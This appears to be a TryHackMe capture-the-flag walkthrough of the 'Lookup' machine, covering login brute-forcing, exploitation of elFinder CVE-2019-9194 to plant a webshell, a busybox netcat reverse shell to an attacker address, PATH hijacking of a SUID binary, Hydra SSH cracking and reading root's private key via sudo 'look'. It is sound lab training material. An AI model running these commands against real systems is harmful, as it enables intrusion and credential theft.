# Lookup

## Executive Summary

| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| Lookup | tryhackme, josemlwdf | Easy | TryHackMe |

**Summary:** Lookup is a beginner-level Linux machine that chains together several well-defined techniques to achieve full root compromise. Initial reconnaissance exposes a web application hosted at `lookup.thm` with a custom login portal. Username enumeration via fuzzing identifies two valid accounts (`admin` and `jose`), and a password spray against `jose` with `rockyou.txt` yields a valid credential (`password123`). Successful authentication redirects the attacker to a subdomain (`files.lookup.thm`) running **elFinder 2.1.47** — a web-based file manager vulnerable to **CVE-2019-9194**, a PHP connector command injection flaw with a CVSS score of 9.8. Exploiting this vulnerability grants a reverse shell as `www-data`. Post-exploitation enumeration reveals a custom SUID binary (`/usr/sbin/pwm`) that executes the `id` command using a **relative path**, making it susceptible to **PATH hijacking**. By planting a fake `id` binary in `/tmp` that impersonates the user `think`, the binary is tricked into dumping `think`'s password list. Hydra is then used to crack `think`'s SSH password from that list. Once logged in as `think`, a `sudo -l` check reveals the ability to run `/usr/bin/look` as root — a GTFOBins-documented file-read primitive — which is used to exfiltrate root's SSH private key. This key is used to SSH directly into the machine as `root`, completing the full compromise.

---

## Reconnaissance

### Port Scanning

A full-port Nmap scan with service and script detection was run against the target:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/lookup]
└─$ nmap -sC -sV -p- -T4 10.48.168.222
Nmap scan report for 10.48.168.222
Host is up (0.093s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 4f:26:9d:7d:10:c3:b2:36:93:c6:db:ad:32:82:0c:e7 (RSA)
|   256 ef:4d:55:19:7c:f7:af:04:16:df:98:2c:f6:9c:6e:33 (ECDSA)
|_  256 f9:58:3c:be:97:be:c6:b3:00:57:91:53:a6:8d:a2:fe (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://lookup.thm
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 527.32 seconds
```

Two ports are open:
- **Port 22 (SSH):** OpenSSH 8.2p1 — likely only useful once credentials are obtained.
- **Port 80 (HTTP):** Apache 2.4.41, which immediately redirects to `http://lookup.thm`. The `/etc/hosts` file must be updated to resolve this hostname.

### Web Application — Initial Access Point

Navigating to `http://lookup.thm` in a browser reveals a minimalist login page:

![Login page at lookup.thm](image.png)

Inspecting the page source confirms the form POSTs credentials to `login.php`:

```javascript
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Login Page</title>
  <link rel="stylesheet" href="styles.css">
</head>
<body>
  <div class="container">
    <form action="login.php" method="post">
      <h2>Login</h2>
      <div class="input-group">
        <label for="username">Username</label>
        <input type="text" id="username" name="username" required>
      </div>
      <div class="input-group">
        <label for="password">Password</label>
        <input type="password" id="password" name="password" required>
      </div>
      <button type="submit">Login</button>
    </form>
  </div>
</body>
</html>
```

### Directory & Subdomain Enumeration

A `feroxbuster` scan confirms the attack surface is limited to `login.php` and `index.php`:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/lookup]
└─$ feroxbuster -u http://lookup.thm/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x txt,php,zip

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://lookup.thm/
 🚩  In-Scope Url          │ lookup.thm
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [txt, php, zip]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
403      GET        9l       28w      275c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        9l       31w      272c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       50l       84w      687c http://lookup.thm/styles.css
200      GET        1l        0w        1c http://lookup.thm/login.php
200      GET       26l       50w      719c http://lookup.thm/
200      GET       26l       50w      719c http://lookup.thm/index.php
```

A subdomain fuzz with `ffuf` using virtual host headers returns only `www` — matching the same 719-byte response as the root domain, so no new attack surface is exposed there. The interesting subdomain is later revealed dynamically upon successful login.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/lookup]
└─$ ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://lookup.thm/ -H "Host: FUZZ.lookup.thm" -fs 0

www                     [Status: 200, Size: 719, Words: 114, Lines: 27, Duration: 101ms]
:: Progress: [4989/4989] :: Job [1/1] :: 342 req/sec :: Duration: [0:00:13] :: Errors: 0 ::
```

---

## Initial Access

### Username Enumeration

The login endpoint at `login.php` returns **different response sizes** for valid vs. invalid usernames — a classic username enumeration vulnerability. A valid username with a wrong password returns a response of 62 bytes, while an invalid username returns 74 bytes. Filtering on `-fs 74` isolates valid usernames:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/lookup]
└─$ ffuf -w /usr/share/wordlists/seclists/Usernames/Names/names.txt -X POST -d "username=FUZZ&password=password" -H "Content-Type: application/x-www-form-urlencoded" -u http://lookup.thm/login.php -fs 74

admin                   [Status: 200, Size: 62, Words: 8, Lines: 1, Duration: 91ms]
jose                    [Status: 200, Size: 62, Words: 8, Lines: 1, Duration: 92ms]
:: Progress: [10713/10713] :: Job [1/1] :: 304 req/sec :: Duration: [0:00:29] :: Errors: 0 ::
```

Two valid usernames are discovered: **`admin`** and **`jose`**.

### Password Brute-Force

With `jose` as the target, `ffuf` is used with `rockyou.txt` to brute-force the password. A 302 redirect indicates a successful login:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/lookup]
└─$ ffuf -w /usr/share/wordlists/rockyou.txt -X POST -d "username=jose&password=FUZZ" -H "Content-Type: application/x-www-form-urlencoded" -u http://lookup.thm/login.php -fs 62,74

password123             [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 106ms]
```

Credentials confirmed: **`jose` / `password123`**

### Subdomain Discovery via Login Redirect

Verifying the login with `curl` reveals that upon success, the server redirects to a previously unknown subdomain: `http://files.lookup.thm`:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/lookup]
└─$ curl -X POST -d "username=jose&password=password123" http://lookup.thm/login.php -i
HTTP/1.1 302 Found
Date: Fri, 06 Mar 2026 23:09:59 GMT
Server: Apache/2.4.41 (Ubuntu)
Set-Cookie: login_status=success; expires=Sat, 07-Mar-2026 00:09:59 GMT; Max-Age=3600; path=/; domain=lookup.thm
Location: http://files.lookup.thm
Content-Length: 0
Content-Type: text/html; charset=UTF-8
```

The new subdomain is added to `/etc/hosts`:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/lookup]
└─$ echo '10.48.168.222 files.lookup.thm' | sudo tee -a /etc/hosts
10.48.168.222 files.lookup.thm

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/lookup]
└─$ grep files.lookup.thm /etc/hosts
10.48.168.222 files.lookup.thm
```

### elFinder File Manager — CVE-2019-9194

Navigating to `http://files.lookup.thm/elFinder/elfinder.html` reveals a fully-featured web file manager. The "About" dialog discloses the exact version:

![elFinder file manager interface showing files directory](image-1.png)

The "About" panel confirms **elFinder version 2.1.47**, protocol version 2.1047, running jQuery 3.3.1:

![elFinder About dialog confirming version 2.1.47](image-2.png)

> **Key detail from image:** elFinder 2.1.47 — below the patched threshold of 2.1.48. Protocol version 2.1047 and jQuery/jQuery UI: 3.3.1/1.12.1 are also visible, confirming the exact software stack.

Researching this version leads directly to **CVE-2019-9194** — a **command injection vulnerability in the PHP connector** with a CVSS score of **9.8 (Critical)**:

![CVE-2019-9194 search results showing severity Unknown CVSS 9.8](image-3.png)

> **Key detail from image:** The vulnerability affects elFinder **before 2.1.48**, and three public PoCs are available on GitHub, including one by `estebanzarate` and another aggregated by `cyvorsec/TryHackMe`.

The chosen PoC is: [CVE-2019-9194-elFinder-Command-Injection-PoC](https://github.com/estebanzarate/CVE-2019-9194-elFinder-Command-Injection-PoC/blob/main/CVE-2019-9194.py)

The exploit works by uploading a malicious JPEG file to the elFinder PHP connector and then triggering command injection during an image rotation operation. The injected command writes a webshell (`SecSignal.php`) to the web root:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/lookup]
└─$ python3 CVE-2019-9194.py http://files.lookup.thm/elFinder/
[*] Uploading malicious image...
[*] File uploaded, hash: l1_U2VjU2lnbmFsLmpwZztlY2hvIDNjM2Y3MDY4NzAyMDczNzk3Mzc0NjU2ZDI4MjQ1ZjQ3NDU1NDViMjI2MzIyNWQyOTNiMjAzZjNlMGEgfCB4eGQgLXIgLXAgPiBTZWNTaWduYWwucGhwO2VjaG8gU2VjU2lnbmFsLmpwZw
[*] Triggering command injection via image rotation...
[*] Checking for webshell...
[+] Pwned!
[+] Interactive shell (Ctrl+C to exit)

$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$
```

Remote code execution is confirmed as `www-data`. A stable reverse shell is then obtained by using the webshell to execute a `busybox` netcat payload:

```bash
$ busybox nc 192.168.245.207 4444 -e /bin/bash
```

On the attacker machine:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/lookup]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.245.207] from (UNKNOWN) [10.48.168.222] 35090
which python3
/usr/bin/python3
python3 -c 'import pty;pty.spawn("/bin/bash")'
<var/www/files.lookup.thm/public_html/elFinder/php$ ^Z
zsh: suspended  nc -lvnp 4444

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/lookup]
└─$ stty raw -echo; fg
[1]  + continued  nc -lvnp 4444

<var/www/files.lookup.thm/public_html/elFinder/php$ export SHELL=/bin/bash
<ublic_html/elFinder/php$ export TERM=xterm-256color
www-data@ip-10-48-168-222:/var/www/files.lookup.thm/public_html/elFinder/php$ stty rows 50 cols 75
www-data@ip-10-48-168-222:/var/www/files.lookup.thm/public_html/elFinder/php$ reset
```

A fully interactive TTY is now established as `www-data`.

---

## Privilege Escalation

### Internal Enumeration

Enumerating local users with login shells and inspecting home directories reveals three users of interest — `think`, `ssm-user`, and `ubuntu`. The `think` user has a protected `.passwords` file and a `user.txt` flag, both readable only by the `think` group:

```bash
www-data@ip-10-48-168-222:/var$ cat /etc/passwd | grep "sh$"
root:x:0:0:root:/root:/usr/bin/bash
think:x:1000:1000:,,,:/home/think:/bin/bash
ssm-user:x:1001:1001::/home/ssm-user:/bin/sh
ubuntu:x:1002:1003:Ubuntu:/home/ubuntu:/bin/bash

www-data@ip-10-48-168-222:/var$ ls -la /home
total 20
drwxr-xr-x  5 root     root     4096 Mar  6 22:31 .
drwxr-xr-x 19 root     root     4096 Mar  6 22:31 ..
drwxr-xr-x  2 ssm-user ssm-user 4096 May 28  2025 ssm-user
drwxr-xr-x  5 think    think    4096 Jan 11  2024 think
drwxr-xr-x  3 ubuntu   ubuntu   4096 Mar  6 22:31 ubuntu

www-data@ip-10-48-168-222:/home/think$ ls -la
total 40
drwxr-xr-x 5 think think 4096 Jan 11  2024 .
drwxr-xr-x 5 root  root  4096 Mar  6 22:31 ..
lrwxrwxrwx 1 root  root     9 Jun 21  2023 .bash_history -> /dev/null
-rwxr-xr-x 1 think think  220 Jun  2  2023 .bash_logout
-rwxr-xr-x 1 think think 3771 Jun  2  2023 .bashrc
drwxr-xr-x 2 think think 4096 Jun 21  2023 .cache
drwx------ 3 think think 4096 Aug  9  2023 .gnupg
-rw-r----- 1 root  think  525 Jul 30  2023 .passwords
-rwxr-xr-x 1 think think  807 Jun  2  2023 .profile
drw-r----- 2 think think 4096 Jun 21  2023 .ssh
lrwxrwxrwx 1 root  root     9 Jun 21  2023 .viminfo -> /dev/null
-rw-r----- 1 root  think   33 Jul 30  2023 user.txt
```

### SUID Binary Discovery — `/usr/sbin/pwm`

A search for SUID binaries reveals a non-standard binary: `/usr/sbin/pwm`, owned by root with the SUID bit set (`-rwsr-sr-x`):

```bash
www-data@ip-10-48-168-222:/home$ find / -type f -perm -4000 -exec ls -la {} + 2>/dev/null
...
-rwsr-sr-x 1 root   root             17176 Jan 11  2024 /usr/sbin/pwm
...
```

Running it reveals its behaviour — it calls the `id` command to determine the current username, then looks for a `.passwords` file in that user's home directory:

```bash
www-data@ip-10-48-168-222:/home$ pwm
[!] Running 'id' command to extract the username and user ID (UID)
[!] ID: www-data
[-] File /home/www-data/.passwords not found
```

The critical flaw: **`pwm` calls `id` using a relative path**, not `/usr/bin/id`. This makes it vulnerable to **PATH hijacking**.

### PATH Hijacking to Dump think's Password List

By placing a malicious `id` script in `/tmp` that outputs `think`'s identity, and prepending `/tmp` to the `PATH`, the SUID binary is tricked into reading `/home/think/.passwords` and dumping its contents:

```bash
www-data@ip-10-48-168-222:/tmp$ echo '#!/bin/bash' > /tmp/id
www-data@ip-10-48-168-222:/tmp$ echo 'echo "uid=33(think) gid=33(think) groups=(think)"' >> /tmp/id
www-data@ip-10-48-168-222:/tmp$ chmod +x /tmp/id
www-data@ip-10-48-168-222:/tmp$ export PATH=/tmp:$PATH
www-data@ip-10-48-168-222:/tmp$ /usr/sbin/pwm
[!] Running 'id' command to extract the username and user ID (UID)
[!] ID: think
jose1006
jose1004
jose1002
jose1001teles
jose100190
jose10001
jose10.asd
jose10+
jose0_07
jose0990
jose0986$
jose098130443
jose0981
jose0924
jose0923
jose0921
thepassword
jose(1993)
jose'sbabygurl
jose&vane
jose&takie
jose&samantha
jose&pam
jose&jlo
jose&jessica
jose&jessi
josemario.AKA(think)
jose.medina.
jose.mar
jose.luis.24.oct
jose.line
jose.leonardo100
jose.leas.30
jose.ivan
jose.i22
jose.hm
jose.hater
jose.fa
jose.f
jose.dont
jose.d
jose.com}
jose.com
jose.chepe_06
jose.a91
jose.a
jose.96.
jose.9298
jose.2856171
```

The full contents of `think`'s `.passwords` file are now in hand — a personalised wordlist tied to the user `jose`.

### SSH Brute-Force — think's Credentials

The dumped list is saved locally and used with Hydra to brute-force SSH for the `think` account:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/lookup]
└─$ hydra -l think -P pass.txt ssh://10.48.168.222
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-03-07 07:28:06
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 49 login tries (l:1/p:49), ~4 tries per task
[DATA] attacking ssh://10.48.168.222:22/
[22][ssh] host: 10.48.168.222   login: think   password: jos[REDACTED]
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-03-07 07:28:16
```

Credentials confirmed: **`think` / `jos[REDACTED]`**

### Lateral Movement — SSH as think

```bash
PS D:\tryhackme-writeups> ssh think@10.48.168.222
think@10.48.168.222's password:
...
think@ip-10-48-168-222:~$ id
uid=1000(think) gid=1000(think) groups=1000(think)
```

### Sudo Privilege Check — `/usr/bin/look`

Running `sudo -l` reveals that `think` can execute `/usr/bin/look` as any user without restriction:

```bash
think@ip-10-48-168-222:~$ sudo -l
[sudo] password for think:
Matching Defaults entries for think on ip-10-48-168-222:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User think may run the following commands on ip-10-48-168-222:
    (ALL) /usr/bin/look
```

### Root Escalation via `look` (GTFOBins — File Read)

The `look` utility is documented on **GTFOBins** as a file-read primitive when run with sudo. It prints all lines in a file that begin with a given prefix — supplying an empty prefix (`''`) causes it to print the entire file:

![GTFOBins entry for `look` showing sudo file read technique](image-4.png)

> **Key detail from image:** The GTFOBins page for `look` explicitly states: *"This executable can read data from local files"* and demonstrates the sudo technique with the command `look '' /path/to/input-file`. The page has 12,748 stars, confirming it as a widely-known reference.

This is used to read root's SSH private key directly:

```bash
think@ip-10-48-168-222:~$ LFILE=/root/.ssh/id_rsa
think@ip-10-48-168-222:~$ sudo /usr/bin/look '' "$LFILE"
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
.............................[REDACTED]...............................
DgTNYOtefYf4OEpwAAABFyb290QHVidW50dXNlcnZlcg==
-----END OPENSSH PRIVATE KEY-----
```

The key is saved and its permissions are set correctly before using it to SSH in as root:

```bash
think@ip-10-48-168-222:~$ sudo /usr/bin/look '' "$LFILE" > id_rsa_root
think@ip-10-48-168-222:~$ chmod 600 id_rsa_root
think@ip-10-48-168-222:~$ ssh -i id_rsa_root root@localhost
...
root@ip-10-48-168-222:~# id
uid=0(root) gid=0(root) groups=0(root)
root@ip-10-48-168-222:~# whoami;hostname
root
ip-10-48-168-222
```

### Flags

```bash
root@ip-10-48-168-222:~# cat /home/think/user.txt /root/root.txt
383[REDACTED]
5a2[REDACTED]
```

---

## Attack Chain Summary

1. **Reconnaissance:** Full-port Nmap scan reveals SSH (22) and HTTP (80). The web server redirects to `lookup.thm`, which hosts a PHP login page. Directory busting confirms `login.php` as the sole entry point.

2. **Vulnerability Discovery:** Username enumeration via `ffuf` against `login.php` identifies differing response sizes for valid (`62 bytes`) vs. invalid (`74 bytes`) usernames, exposing accounts `admin` and `jose`. Password brute-force against `jose` with `rockyou.txt` yields `password123`. A successful login redirects to the hidden subdomain `files.lookup.thm`, which exposes **elFinder 2.1.47** — a web file manager vulnerable to **CVE-2019-9194** (PHP connector command injection, CVSS 9.8).

3. **Exploitation:** A public PoC for CVE-2019-9194 uploads a malicious JPEG and triggers command injection during image rotation to deploy a webshell. A `busybox` reverse shell is then issued, granting an interactive shell as `www-data`.

4. **Internal Enumeration:** SUID binary discovery uncovers the non-standard `/usr/sbin/pwm`, which calls `id` via a **relative path**. A PATH hijacking attack plants a fake `id` binary in `/tmp` that spoofs the `think` user identity, causing `pwm` to dump the contents of `/home/think/.passwords` — a personalised wordlist of 49 password candidates.

5. **Privilege Escalation (User → Root):** Hydra brute-forces SSH for `think` using the dumped wordlist, finding `jos[REDACTED]`. Once logged in, `sudo -l` reveals `(ALL) /usr/bin/look`. Using the GTFOBins file-read technique (`sudo look '' /root/.ssh/id_rsa`), root's SSH private key is exfiltrated. The key is used to authenticate directly as `root` via `ssh -i id_rsa_root root@localhost`, completing the full chain from unauthenticated web user to root shell.
